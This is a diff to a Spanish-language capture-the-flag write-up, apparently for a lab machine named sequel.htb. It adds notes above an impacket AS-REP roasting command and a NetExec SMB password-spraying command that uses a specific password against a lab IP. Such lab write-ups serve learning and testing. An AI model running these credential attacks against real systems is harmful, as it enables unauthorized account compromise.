@@ -163,13 +163,14 @@ Vamos a explotar esta opción cargando una shell en base64 [[#MSSQL Shell Inject
 # Explotación
 ## AS-REP Roasting Attack
 
-Con 
+Con [[IMPACKET]] probaremos si es suceptible al ataque de AS-REB Roasting
 ```shell
 impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/
 ```
 
 ## Password spraying
 
+Con [[CRACKMAPEXEC]] hacemos password spraying para ver si una contraseña vale para otro osuario
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p 'KxEPkKe6R8su' 
 ```
